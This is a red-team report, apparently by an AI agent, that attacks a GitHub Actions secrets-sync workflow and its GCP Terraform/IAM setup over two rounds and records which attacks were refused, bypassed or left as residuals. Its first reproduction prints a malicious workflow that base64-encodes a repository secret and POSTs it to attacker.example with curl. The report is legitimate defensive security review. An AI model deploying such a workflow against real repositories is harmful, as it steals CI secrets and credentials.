# Handoff — `Red Team`, adversarial D19 secrets-sync

Agent: Red Team (independent; authored nothing in this wave — attack and report
only, **no fixes**)
Contract: `llm/sprints/2026-09-hub/contracts/adversarial-d19-secrets-sync.md`
§Red Team
Owner decision: **D19** — all secrets are handled by a GitHub workflow, never by a
manual `gcloud` step
Branch: `feat/secrets-sync`, working tree, HEAD `757474a` (nothing of this wave
committed)
Design authority: `llm/governance/adr/0022-annotation-export-transport.md` §5
(amended on D19); pattern `llm/governance/patterns/secrets-management.md`

Artifacts under test (sha256):

```
.github/workflows/secrets-sync.yml                        c27a2357ba3a8dff6ff0d8453d353b184c0be7c15eed16ece87354928c76d085
infra/secrets-sync.tf                                      6c2ccd90cac223b365edb8b4da05a82090e93ab749308935e5f69a3bbf3a8a4f
infra/versions.tf                                          cd304697db6a12fc76d4601c11d6bbaf0b59007f9812acbf53443c376fd368bb
infra/notes-sync.tf                                        0fdcfcc056e25be079caaff541fc39e37f090d9321868f117f546e636462b262
infra/gate.tf                                              437e97f0638029318bcc4118d330146299841f39a95a7e94128919bf99e8a363
infra/wif.tf                                               cdfddaededdcab70bcd818eb43c7622e33ac3859ff504b0e31d7b431899aaddb
.github/CODEOWNERS                                         28e8ac3973b7f5e028b90bdf4b21bfb845e91d2b51b95e73f23b4f73501f88b0
llm/governance/patterns/secrets-management.md              3e31b989cb0d8b4d71a18f8f88f7e2a95f7dff2b3c9cd07ecaeb692feddbd846
llm/governance/adr/0022-annotation-export-transport.md     92a76441ad78dca3ab2e45bda58cba907140ee048bbab26cfd96d2bf4b7389f1
```

Working tree: I changed **no tracked file** (the only new file is this handoff)
and ran **no git/gh/gcloud/terraform/firebase mutation**. All commands were
read-only: `git`, `gh api` GETs, `grep`, `python3`, local file reads. Scratch is
under `/tmp/opencode/d19/` (`malicious-secrets-sync.yml`). No production system was
contacted; no credential was created or read. The one live-adjacent read was the
**local, git-ignored** `infra/terraform.tfstate.backup`, grepped only for key
material (none found).

## Summary

**8 attacks: 3 BYPASS (control/config/documentation gaps), 4 REFUSED, 1
REFUSED-with-live-UNTESTED residual.** The core claim of D19 holds against an
unprivileged attacker: the sync workflow has **no `pull_request` trigger**, it is
the **only** workflow that reads `NOTES_EXPORT_APP_KEY`, forks receive no
repository secrets, and the pre-merge trigger-manipulation paths
(`pull_request_target`, `workflow_run`, `issue_comment`, `workflow_dispatch` on an
attacker branch) all require either write/merge authority the attacker does not
have or a workflow file already on `main`. Within the workflow, the value is never
echoed, never on a command line, never in a step output/summary/artifact/comment,
`set -x` is never enabled, and a `0600` temp file under `umask 077` is removed by an
`EXIT` trap.

The three bypasses are all about the **claim being stronger than the enforced
control**, not about a reachable exfiltration today:

1. **RTD19-01 — the "tracked as issue #112" narrowing follow-up does not exist.**
   `infra/secrets-sync.tf:37-39` and `:44` record the least-privilege narrowing as
   "tracked as issue #112", but `gh api repos/djjay0131/website/issues/112` returns
   **404** on the owner-authenticated token. The project-level
   `roles/secretmanager.admin` is therefore **untracked**; the contract's own
   question ("whether #112 closes it") has no answer because there is no #112.
2. **RTD19-02 — the "owner's review gate (.github/CODEOWNERS reviews every
   change)" is not enforced.** `secrets-sync.yml:39-41` rests the residual risk on
   CODEOWNERS review, but branch protection reports
   `required_approving_review_count: 0`, `require_code_owner_reviews: false`,
   `enforce_admins: false`, and `rulesets: []`. CODEOWNERS is a social control
   only.
3. **RTD19-03 — the control plane still ships a manual `gcloud secrets` step.**
   The pattern says "No human ever runs `gcloud secrets …`"
   (`patterns/secrets-management.md:11-13,31-32`) and ADR-0022 §5 says the manual
   hard stop is removed, but `STATE.md:3852-3856` still prints
   `gcloud secrets create …` / `gcloud secrets versions add …` as owner hard stop 2,
   and STATE.md carries **no D19 entry at all** (grep `D19` → none).

One configuration gap is recorded (RTD19-04): `wif.tf:66-71` excludes only
`pull_request_target`, while `workflow_run` and `issue_comment` run with
`GITHUB_REF=refs/heads/main` and would satisfy the `gate-deploy` binding
(`gate.tf:478-482`). It is merge-gated, so REFUSED externally, but it is a
defense-in-depth hole worth closing.

## Assumptions

- The threat model is the **unprivileged external attacker**: the repo is public
  (`visibility: public`, `allow_forking: true`, `forks_count: 0`), and the **only**
  collaborator is `djjay0131` with `admin` (`gh api …/collaborators`). There is no
  second writer, no GitHub App, no deploy key.
- "Attacker with write/merge authority" is out of scope as a *technical* control
  question; it is handled by naming the social/review residual, not by claiming a
  technical stop. A compromised owner account defeats every control here.
- The current repository has **zero Actions secrets** (`gh api …/actions/secrets`
  → `total_count: 0`), so today there is literally nothing to exfiltrate and the
  workflow must no-op green. I could not observe a populated run.
- GitHub platform behaviour is taken from the primary docs (fork PRs receive no
  secrets; `workflow_run`/`issue_comment`/`pull_request_target` require the
  workflow file on the default branch and run with the default-branch ref;
  `workflow_dispatch` may be dispatched by a writer against any branch/tag once the
  file is on the default branch). Cited in the reproductions.
- No production call is available or permitted, so gcloud-response injection and a
  populated run are UNTESTED against the live service; the code argument is given.

## Attack table

| # | setup | observed | verdict | code path |
|---|-------|----------|---------|-----------|
| RTD19-A1 | Craft a PR that replaces `secrets-sync.yml` with a version that base64-prints and POSTs `NOTES_EXPORT_APP_KEY` (scratch: `/tmp/opencode/d19/malicious-secrets-sync.yml`). | `secrets-sync.yml` triggers only `workflow_dispatch` and `push` to `main` (paths: itself). A PR never runs it. Fork PRs get no repository secrets and are gated by first-time-contributor approval. Only the owner can open a same-repo branch. | **REFUSED** (external); residual = a malicious file merged to `main` | `secrets-sync.yml:43-50`, `:91`,`:117`; `wf` docs "Workflows in forked repositories" |
| RTD19-A2 | Modify a workflow to add `pull_request_target`, `workflow_run`, or `issue_comment`; or `gh workflow run secrets-sync.yml --ref <attacker-branch>`. | All three triggers require the workflow file to exist on the default branch → take effect only after merge. `workflow_dispatch` needs write (owner only) and cannot select a fork ref. **But** `workflow_run`/`issue_comment` run with `GITHUB_REF=refs/heads/main`, so the WIF condition (only `pull_request_target` is excluded) and the `gate-deploy` binding would both admit them once merged. | **REFUSED** (external) / **config GAP** (merge-gated) | `wif.tf:66-71`; `gate.tf:478-482`; `secrets-sync.yml:43-50` |
| RTD19-A3 | Exfiltrate through every `run:` block: stdout, `$GITHUB_OUTPUT`, `$GITHUB_STEP_SUMMARY`, artifact, comment. | Guard step only tests `[ -z ]` and writes `have_key=true/false`. Sync step writes the value to a `0600` file (`umask 077`, `chmod 600`, `EXIT` trap), passes only the **path** to `gcloud --data-file`, prints only the secret NAME and version NUMBERS. No `set -x`, no summary, no artifact, no comment; job token is `contents:read`+`id-token:write` with `permissions: {}` at top. The value is env-borne, never arg-borne. | **REFUSED** | `secrets-sync.yml:53,64-66,88-98,114-156` |
| RTD19-A4 | Make `gcloud` echo the key: crafted `--format`, a crafted version name, an error echoing stdin, a core dump, a `mktemp` collision. | `--format` is the constant `value(name)`; the parsed strings are version resource names (`…/versions/N`) rebound with `${X##*/}`. `versions list` returns names, not values. No `set -x`. `mktemp` default template + `umask 077` + `chmod 600`; a killed runner could skip the trap but GitHub-hosted runners are single-tenant and discarded. | **REFUSED** (live injection UNTESTED; no prod contact) | `secrets-sync.yml:119-125,140-154` |
| RTD19-A5 | Steer the apply with a repository variable or a crafted commit: read the secret into plan output, tamper with state, or apply a destructive plan. | Apply is `-auto-approve -refresh=false -lock-timeout=5m` over the repo's `infra/`, with only `TF_VAR_*` from repository variables (identifiers). The key is never a Terraform input/output, so today there is no value-leak path. `-refresh=false` hides drift (out-of-band deletion/tamper undetected; the narrow identity plans from stored state). "adds-only" is prose, not enforced — `-auto-approve` runs an **unreviewed** plan, and the same identity holds `objectAdmin` on the state bucket, so it can rewrite the state the apply trusts. | **REFUSED** for the key; **UNTESTED** destructive (merge-gated) | `secrets-sync.yml:191-207,219-222`; `secrets-sync.tf:61-74` |
| RTD19-A6 | Enumerate what `gate-deploy` can reach and whether #112 covers it. | Project-level `secretmanager.admin` (read/create/delete **every** secret + `setIamPolicy`), project-level `serviceusage.serviceUsageAdmin` (enable/**disable any API**), `storage.objectAdmin`+`legacyBucketReader` on the tfstate bucket (read/write/delete state), `roles/browser`. Pre-existing `run.developer`+`iam.serviceAccountUser` on `hub-gate` let it deploy a revision **running as `hub-gate`**, which reads the private bucket, the Firestore allowlist and the secret. Follow-up #112 is absent (404). | **BYPASS** (scope + absent follow-up) | `secrets-sync.tf:37-44,49-53,61-74,82-86`; `gate.tf:456-468`, `:11-12` |
| RTD19-A7 | Check the control-plane documents for the "never a manual gcloud" rule. | Pattern forbids manual `gcloud secrets`; ADR-0022 §5 removes the step. `STATE.md:3852-3856` still prints both `gcloud secrets` commands as an owner hard stop, and STATE.md has no D19 section (the contract lists `STATE.md §D19` as an artifact). | **BYPASS** (policy contradiction) | `patterns/secrets-management.md:11-13,31-32`; `STATE.md:3852-3856`; `adr/0022:15-21,92-127` |
| RTD19-A8 | Check whether the claimed CODEOWNERS review gate is enforced. | `gh api …/branches/main/protection`: `required_approving_review_count: 0`, `require_code_owner_reviews: false`, `enforce_admins: false`; `rulesets: []`; `CODEOWNERS` = `* @djjay0131`. The review is not required by GitHub; the workflow's residual-risk sentence assumes it is. | **BYPASS** (control gap) | `secrets-sync.yml:39-41`; `.github/CODEOWNERS:4`; branch-protection API |

## Reproductions

### RTD19-A1 — crafted workflow in a PR (scratch diff)

The malicious file (only the trigger and the payload differ) is at
`/tmp/opencode/d19/malicious-secrets-sync.yml`:

```yaml
name: secrets-sync
on:
  workflow_dispatch:
  push:
    branches: [main]
    paths:
      - .github/workflows/secrets-sync.yml
permissions: {}
jobs:
  sync-secret:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      id-token: write
    env:
      NOTES_EXPORT_APP_KEY: ${{ secrets.NOTES_EXPORT_APP_KEY }}
    steps:
      - name: exfiltrate
        run: |
          printf '%s' "${NOTES_EXPORT_APP_KEY}" | base64 -w0
          echo
          curl -sSf -X POST "https://attacker.example/collect" \
            --data-binary "$(printf '%s' "${NOTES_EXPORT_APP_KEY}" | base64 -w0)" || true
```

Reasoning, not assertion: (a) opening this as a fork PR runs **no** `secrets-sync`
job, because the workflow has no `pull_request` trigger; (b) even if it did, GitHub
"secrets are not passed to the runner when a workflow is triggered from a forked
repository" and first-time contributors need approval; (c) a same-repo branch PR
would run the head version *with* secrets, but creating a same-repo branch requires
`push`, held only by the owner. Therefore the only pre-merge exposure is the owner
acting against themselves. On **merge**, the `push` to `main` runs the merged
file — that is the acknowledged residual, and it is exactly where RTD19-A8 matters:
nothing in GitHub forces the CODEOWNERS review the comment relies on.

Environment checks backing this:

```
$ gh api repos/djjay0131/website --jq '{private,visibility,allow_forking,forks_count}'
{"allow_forking":true,...,"forks_count":0,"private":false,"visibility":"public"}
$ gh api repos/djjay0131/website/collaborators --jq '.[].login'
djjay0131
$ gh api repos/djjay0131/website/actions/permissions/fork-pr-contributor-approval
{"approval_policy":"first_time_contributors"}
```

### RTD19-A2 — `workflow_run`/`issue_comment` satisfy the WIF gate

`wif.tf:66-71` admits a token when the repository ids/name match and
`assertion.event_name != 'pull_request_target'`. It does **not** restrict the event
to `push`/`workflow_dispatch`. Per the GitHub events reference, `workflow_run` and
`issue_comment` run with "Last commit on default branch / Default branch"
(`GITHUB_REF = refs/heads/main`), so `attribute.repository_id_ref =
<repo_id>/refs/heads/main` (`wif.tf:63`) matches and `gate.tf:478-482` admits the
principal. A merged workflow on either trigger would therefore both (i) receive
repository secrets and (ii) authenticate as `gate-deploy`. Today neither trigger
exists on any workflow, so nothing is reachable; this is the hole to close before
one is added. Also: `cloudsdk`/provider aside, `workflow_dispatch` is documented as
dispatchable "against any branch or tag" once the file is on the default branch, so
a writer could run an older/newer `secrets-sync.yml` ref — ref `refs/heads/main` is
the only ref the WIF binding accepts, which is the control that holds.

### RTD19-A3/A4 — no leak in the run bodies (quoted)

```
88:      - name: Check whether the App private key is configured
91:        env: { NOTES_EXPORT_APP_KEY: ${{ secrets.NOTES_EXPORT_APP_KEY }} }
92:        run: |
93:          if [ -z "${NOTES_EXPORT_APP_KEY}" ]; then
94:            echo "have_key=false" >> "$GITHUB_OUTPUT"
...
115:        if: steps.guard.outputs.have_key == 'true'
119:          set -euo pipefail
120:          umask 077
121:          KEY_FILE="$(mktemp)"
122:          trap 'rm -f "${KEY_FILE}"' EXIT
124:          printf '%s' "${NOTES_EXPORT_APP_KEY}" > "${KEY_FILE}"
141:            --project "${GCP_PROJECT_ID}" --data-file="${KEY_FILE}" \
142:            --format 'value(name)')"
143:          echo "Added ${SECRET_NAME} version ${NEW_FULL##*/}."
150:            gcloud secrets versions disable "${OLD_FULL##*/}" \
```

No `echo "$KEY"`, no `set -x`, no `>> "$GITHUB_STEP_SUMMARY"`, no
`actions/upload-artifact`, no `gh pr comment`; `--format` is constant; only version
resource names are rebound and printed. `terraform` job condition is
`needs.sync-secret.outputs.have_key == 'true'`, which carries no value
(`secrets-sync.yml:75-76,163`).

### RTD19-A5 — Terraform surface

```
219:      - name: "Terraform apply (adds-only — the notes-sync secret accessor binding and the gate env)"
221:        run: |
222:          terraform apply -input=false -auto-approve -refresh=false -lock-timeout=5m
```

The secret value never enters `infra/` (only the `secretAccessor` binding in
`notes-sync.tf:23-28` and identifier envs in `gate.tf:313-340`). A local, ignored
`infra/terraform.tfstate.backup` (184 KB) grepped for `PRIVATE KEY|BEGIN .*KEY|
client_secret|private_key` returns only the **name** `notes-export-app-key`, i.e.
no value in state — consistent with the design. The residual is the *unreviewed*
`-auto-approve` + the same identity's `objectAdmin` over the state it consumes.

### RTD19-A6/A7/A8 — least privilege, follow-up, review gate

```
$ gh api repos/djjay0131/website/issues/112
{"message":"Not Found",...,"status":"404"}
$ gh api repos/djjay0131/website/branches/main/protection
..."required_pull_request_reviews":{"dismiss_stale_reviews":true,
 "require_code_owner_reviews":false,"required_approving_review_count":0}...
 "enforce_admins":{"enabled":false},..."allow_force_pushes":{"enabled":false}...
$ gh api repos/djjay0131/website/rulesets
[]
$ gh api repos/djjay0131/website/actions/permissions/workflow
{"default_workflow_permissions":"read","can_approve_pull_request_reviews":false}
```

`taskset` view of `gate-deploy` after D19: `secretmanager.admin` (project, so it
can read `notes-export-app-key` and any future secret — the sync identity **is** a
reader of values, contrary to the pattern's "the sync identity is not a reader of
values it did not create"), `serviceusage.serviceUsageAdmin` (project — disable any
API), `storage.objectAdmin`+`legacyBucketReader` (tfstate bucket), `roles/browser`,
plus `run.developer`/`iam.serviceAccountUser` on `hub-gate`. The last pair is the
real leap: deploying a revision that runs as `hub-gate` reaches the private bucket,
the Firestore allowlist and the secret, which contradicts the claim that "a
compromised deploy pipeline cannot read private content" (`gate.tf:11-12`).

## Recommendations

Not fixes (this is report-only); these are what the owner should require before
merge or immediately after:

1. **File #112, or renumber the reference.** `secrets-sync.tf:37-39,44` and
   ADR-0022 must point at a real issue. It should cover: (i) secret-scoped
   `secretmanager.admin` (or `secretmanager.secretVersionManager` +
   `secretmanager.secrets.create` on a create-only project role) so `gate-deploy`
   cannot read values it did not create; (ii) the project-wide
   `serviceusage.serviceUsageAdmin` narrowed to
   `serviceusage.services.enable` via a custom role; (iii) `objectAdmin` on the
   state bucket reduced if a narrower "object creator/getter" role suffices.
2. **Fix the residual-risk sentence or the control.** Either set
   `require_code_owner_reviews: true` (and a non-zero approval count) on `main`, or
   reword `secrets-sync.yml:39-41` to say the review gate is *social*, not a GitHub
   check. Do not leave a control asserted that branch protection does not provide.
3. **Update `STATE.md`.** Remove the manual `gcloud secrets` hard stop
   (`STATE.md:3852-3856`) and add the D19 section the contract lists; today the
   committed record contradicts the pattern.
4. **Harden the WIF condition.** Extend `wif.tf:70` to restrict the accepted event
   to the intended set (`push`/`workflow_dispatch`) rather than excluding only
   `pull_request_target`; this closes `workflow_run`/`issue_comment` before either
   is ever added. Consider a per-workflow-caller binding if Workload Identity can
   express it.
5. **Review the plan, not just auto-approve.** If a broad `secretmanager.admin`
   must remain, at minimum run `terraform plan -out` and refuse to apply a plan that
   contains any destroy/replace; `-refresh=false` + `-auto-approve` means no human
   sees the diff that a merged commit produces.
6. **Record the deploy-identity overlap.** `gate-deploy`'s
   `run.developer`+`serviceAccountUser` on `hub-gate` is the largest lateral path;
   state it explicitly where `gate.tf:11-12` currently claims the opposite.

## Alternatives

- **No-secret-in-GitHub.** Instead of an Actions secret, have the owner run the App
  installation-token flow entirely server-side and never store the `.pem` in
  GitHub at all (e.g., a break-glass owner-only Secret Manager write via
  console/`gcloud` outside CI). D19 rejects this specifically to remove the manual
  step; the tradeoff is that the key now transits GitHub's secret store.
- **Short-lived credential.** Use OIDC to the two destination repositories (if they
  ever support it) instead of a long-lived App private key, eliminating the key
  from GitHub and Secret Manager entirely.
- **Separate, minimal sync identity.** A dedicated `secrets-sync` service account
  holding only `secretmanager.secrets.create` + `secretVersionManager` on the one
  secret, instead of reusing `gate-deploy`. This keeps the sync identity from
  inheriting the deploy identity's `run.developer`/actAs lateral path.
- **Cloud-only sync trigger.** Trigger the sync from a Cloud-side control
  (Pub/Sub + Cloud Function) rather than a GitHub `push` trigger, so no
  repository-secret read is needed at all.

## Risks

- **Merge is the only real gate** (RTD19-A1/A2/A8): any malicious `secrets-sync.yml`
  or `infra/**` change that lands on `main` runs with the key and `gate-deploy`'s
  broad grants. Branch protection does not force CODEOWNERS review.
- **Untracked least privilege** (RTD19-A6): the broad grants are documented as
  temporary, but the follow-up does not exist, so nothing will catch the widening.
- **Sync identity reads values** (RTD19-A6): `secretmanager.admin` makes the sync
  identity a reader of every secret, contradicting the pattern's stated invariant.
- **Unreviewed destructive apply** (RTD19-A5): `-auto-approve -refresh=false` with
  state-write access means a merged config change is applied with no human diff.
- **Control-plane premise** (RTD19-A7): a security pattern whose own reference
  repository still documents the forbidden manual command is a weak pattern for the
  "family site follows the same steps" claim.
- **Local state residue**: the machine holds `infra/terraform.tfstate*` and a
  325-byte `terraform.tfstate`; they are `.gitignore`d and I found no key material,
  but the operator machine is now a state copy.

## Open questions

1. Was #112 filed in a **different** repository (e.g. `agentic-governance`, or a
   private tracker)? The in-repo reference and this repo's numbering say no; confirm
   before treating it as absent.
2. Does `roles/serviceusage.serviceUsageAdmin` need to be project-wide, or can a
   custom role with `serviceusage.services.enable` alone do it? D19 says "only if
   enabling the API needs it" but grants the full admin role.
3. Is the repo's `required_pull_request_reviews` object (present with `count: 0`)
   actually enabling "require a PR before merging", or is it vestigial? If direct
   push to `main` is possible for the admin (`enforce_admins: false`), the D19
   trigger `push` to `main` can fire from a local `git push` without any review.
4. Should the sync identity be separate from the deploy identity (see Alternatives)
   so the workflow does not inherit the actAs-`hub-gate` path?
5. What is the intended response if a populated run fails mid-sync (new version
   added, prior-version disable loop errors) — is a partially-rotated secret
   detectable, and is there an alert (`monitoring.tf` has no secret-sync alarm)?

## Related docs

- `llm/sprints/2026-09-hub/contracts/adversarial-d19-secrets-sync.md`
- `.github/workflows/secrets-sync.yml`
- `infra/secrets-sync.tf`, `infra/versions.tf`, `infra/notes-sync.tf`,
  `infra/wif.tf`, `infra/gate.tf`, `infra/deploy.tf`
- `.github/CODEOWNERS`
- `llm/governance/adr/0022-annotation-export-transport.md`
- `llm/governance/patterns/secrets-management.md`
- `docs/secrets-management.md`
- `llm/sprints/2026-09-hub/STATE.md` (Wave 6b; no D19 section)
- GitHub docs: *Events that trigger workflows* (`pull_request`, `workflow_run`,
  `issue_comment`, `workflow_dispatch`, "Workflows in forked repositories");
  branch-protection REST response (read-only `gh api`)

## ADR candidates

- **C-D19-1 — The secret-sync identity is not the deploy identity.** Record that
  the workflow that writes a secret must not be the identity that can deploy a
  workload that reads it; the current reuse of `gate-deploy` merges the two blast
  radii that `gate.tf` otherwise works to separate.
- **C-D19-2 — The WIF admission condition names the accepted event, not a
  denylist.** A single `!= 'pull_request_target'` exclusion is unsound as more
  triggers are added; the provider should allowlist the events (and ideally the
  workflow) it is willing to admit.
- **C-D19-3 — "Adds-only" applies must be enforced by a reviewed plan, not by a
  comment.** A repository that calls an apply "adds-only" while running
  `-auto-approve -refresh=false` should either gate on a saved plan or stop calling
  it adds-only.
- (Existing) **C10 — remote GCS state**, adopted by D19 in `infra/versions.tf:25-38`.

**Verdict (Round 1): Comment — no reachable exfiltration by an unprivileged
attacker, but three claims in the artifacts are not backed by the controls they
name (absent #112, unenforced CODEOWNERS review, stale manual-`gcloud` runbook),
plus a WIF admission gap (RTD19-A2) and an unreviewed broad identity. No fix
applied.**

---

# Round 2

Round-2 re-attack of the remediated working tree, branch `feat/secrets-sync`,
HEAD `757474a` (still nothing of this wave committed). The Round-1 table above is
**not edited**; this section appends the re-test.

Updated artifacts (sha256):

```
.github/workflows/secrets-sync.yml   95db1a319bc42ca45fa4123939f313aead47a045bd8b2da3a7d82659ff11c6d3
infra/secrets-sync.tf                6c2ccd90cac223b365edb8b4da05a82090e93ab749308935e5f69a3bbf3a8a4f
llm/sprints/2026-09-hub/STATE.md     4d090e7bdc0b71e5064501715b4726ef44f7d6a181c9023d7d1c5ced175d5115
```

Read-only again: `git status`, `gh api` GETs, `grep`, `python3`, local reads.
No git/gh/gcloud/terraform/firebase mutation; no production contact. The only
write in this round is this appended section.

## Round-2 dispositions of Round-1 findings

| R1 | claim at Round 1 | what changed | Round-2 verdict |
|----|------------------|--------------|-----------------|
| A1 | crafted workflow in a PR cannot run with the secret | triggers unchanged (`secrets-sync.yml:45-52`); still no `pull_request`; other workflows' triggers unchanged | **REFUSED (unchanged)** |
| A2 | WIF excludes only `pull_request_target`; `workflow_run`/`issue_comment` would pass | **recorded as #113**, not fixed; `wif.tf` unchanged | **RECORDED GAP** (open, tracked) |
| A3 | no leak via logs/outputs/summary/artifacts | sync/guard bodies unchanged | **REFUSED (unchanged)** |
| A4 | no `gcloud`-response / `set -x` / temp-file leak | unchanged | **REFUSED (unchanged)** |
| A5 | broad `-auto-approve -refresh=false` apply, adds-only is prose | now `-target`ed to two resources (`secrets-sync.yml:224-226`) | **DOWNGRADED to residual** — no key exfil; the "never touch anything else" comment overstates (dependency closure is still in-graph) |
| A6 | project-level `secretmanager.admin`, #112 did not exist | **#112 filed and verified** (open, body matches); STATE records the fallback | **RECORDED, ACCEPTED TRADEOFF** for the secret scope — with one untracked residual (the actAs-`hub-gate` path), below |
| A7 | STATE still shipped a manual `gcloud secrets` hard stop | STATE amended: `## D19` section added, hard stop removed | **FIXED** |
| A8 | workflow claimed CODEOWNERS review that branch protection does not enforce | header now states the truth and cites #114 (`secrets-sync.yml:38-43`) | **FIXED (in doc)** / #114 open for the control |

## New probes (Round 2)

| # | setup | observed | verdict | code path |
|---|-------|----------|---------|-----------|
| RTD19-R2-N1 | Does `-target` actually fence the apply to the two resources? | Terraform `-target` includes the targets **and their dependency closure**. The two targets pull in `google_service_account.hub_gate`, `google_storage_bucket.private`, `google_project_service.phase1/phase3` and `data.google_project.hub`. So "can never touch anything else even if the state drifts" is overstated: a missing/drifted dependency would be (re)created. No secret value is reachable in this graph. | **RESIDUAL (comment inaccurate)**; no exfil | `secrets-sync.yml:215-226`; `gate.tf:227,358`; `secrets-sync.tf:40-44` |
| RTD19-R2-N2 | Is there an answer-file or `TF_VAR` leak? | No `-var-file`, no plan file, `-input=false`. `TF_VAR_*` are written from **repository variables** (admin-set identifiers) via `$GITHUB_ENV`; the `terraform` job env is only `GCP_*` — the key is never exported to it. A newline in a repo variable could inject extra `$GITHUB_ENV` lines, but only an admin can set one, so it is not an external path. | **REFUSED** (no external path) | `secrets-sync.yml:170-209,224` |
| RTD19-R2-N3 | Does the disable-prior-versions loop leak or misbehave? | `versions add`/`list` return version **resource names**, printed as `${X##*/}`; no value is ever read. If `versions add` returned success with empty output, `NEW_FULL` is empty and the equality guard would miss, disabling the just-added version too (self-inflicted availability loss, not exfil). | **REFUSED** (no exfil); low availability residual | `secrets-sync.yml:142-156` |
| RTD19-R2-N4 | Did any trigger change introduce a PR/fork path? | `secrets-sync.yml` still `workflow_dispatch` + `push` to `main` (paths: itself) only. `ci.yml`, `build.yml`, `gate.yml` triggers byte-unchanged; no new `secrets.*` reference anywhere (only the key in `secrets-sync.yml`). | **REFUSED** | `secrets-sync.yml:45-52`; `grep -rn 'secrets\.' .github/workflows/` |

## Re-attack detail

### A6 — still BYPASS, or recorded tradeoff?

**Recorded, accepted tradeoff (for the Secret Manager breadth).** The follow-up
now exists and was read in full:

```
$ gh api repos/djjay0131/website/issues/112 --jq '{number,state,title}'
{"number":112,"state":"open","title":"Narrow gate-deploy's project-level Secret Manager role (D19 follow-up)"}
```

Its body records exactly the finding — project-level `secretmanager.admin` includes
`secretmanager.versions.access`, so the identity can read any secret in
`cusati-hub`; the test project has one — and plans a secret-scoped admin plus a
create-only project role including `serviceusage.services.enable`. `#113` and
`#114` were also filed and read. D19 explicitly names project-level
`secretmanager.admin` as the permitted fallback (`infra/secrets-sync.tf:29-39`),
and STATE now records it (`STATE.md:3932-3937,3952-3965`). The Round-1 "untracked"
defect is gone; what remains is an **accepted, documented** breadth with a filed
narrowing plan.

**One residual is still untracked.** `gate-deploy` holds `roles/run.developer` on
`hub-gate` (`infra/gate.tf:456-462`) **and** `roles/iam.serviceAccountUser` on the
`hub-gate` runtime SA (`infra/gate.tf:464-468`). Together these let it deploy a
revision that runs **as** `hub-gate`, which reads the private bucket, the Firestore
allowlist and the secret — contradicting `gate.tf:11-12` ("a compromised deploy
pipeline cannot read private content"). Neither #112 (which narrows the Secret
Manager role) nor #113/#114 names this. It is merge/compromise-gated, so it is a
residual, not a reachable external bypass, but it should be filed (see prompt to
the owner in Open questions / Recommendations Round 2).

### A5 — did `-target` open anything?

No. `-target=google_secret_manager_secret_iam_member.hub_gate_notes_export_key`
and `-target=google_cloud_run_v2_service.gate` (`secrets-sync.yml:224-226`) **reduce**
the blast radius versus the Round-1 full apply: unrelated stateful resources can no
longer be changed. It does not, however, enforce the prose claim. `-target` always
includes dependencies, so a drifted/missing `hub-gate` SA, private bucket or
project-service resource is still in the apply graph (RTD19-R2-N1), and
`-auto-approve -refresh=false` still runs an **unreviewed** plan. The gate service
has `deletion_protection=false` (`gate.tf:251`), so a plan that replaced it would
delete-and-recreate a public service. None of this reads or prints the key.

### A7 — verified fixed

```
$ grep -n "gcloud secrets" llm/sprints/2026-09-hub/STATE.md
3846:**Owner decision D19** replaces D18 hard stop 2 (a manual `gcloud secrets
3918:amended (§1, §5); the manual `gcloud secrets create` hard stop is removed.
```

Both hits are prose saying the command is removed; no executable `gcloud secrets`
instruction remains. The `## D19` section (`STATE.md:3913-3966`) and the owner
steps (`STATE.md:3844-3864`) now say "No `gcloud` by hand, ever."

### A8 — verified fixed in the artifact

`secrets-sync.yml:38-43` now says branch protection "requires CI and conversation
resolution but does NOT require a code-owner review, so the merge gate is the
owner's judgement plus `.github/CODEOWNERS` as a social signal (hardening tracked
in #114)." Branch protection is unchanged
(`require_code_owner_reviews:false`, `required_approving_review_count:0`,
`enforce_admins:false`) — correctly left to the owner's console action in #114.

## Round-2 verdict

**Comment — zero new BYPASS; no reachable exfiltration, Round 1 preserved.** All
four Round-1 BYPASS/gap findings are now either **fixed** (A7, A8-in-doc) or
**recorded in an open, tracked issue** (A6→#112, A2→#113, A8's control→#114), and
the `-target` change introduces no new exfiltration path (new probes N1–N4 all
REFUSED). The remaining items are residuals, not bypasses:

1. `#112`, `#113`, `#114` are **open** — the accepted tradeoffs are not yet closed.
2. The `gate-deploy` → actAs-`hub-gate` lateral path (`gate.tf:456-468`) is **not
   covered by any filed issue**; file it, and correct the `gate.tf:11-12` claim.
3. The `-target` comment ("never touch anything else", `secrets-sync.yml:216-217`)
   overstates the guarantee (dependencies are in-graph); reword to "only the two
   resources and their dependencies".
4. "Adds-only" is still enforced by a comment, not a reviewed plan
   (`secrets-sync.yml:224`); the `-target` narrowing makes this materially safer
   but does not remove it.

I applied no fix. The Round-1 attack table above stands unchanged.
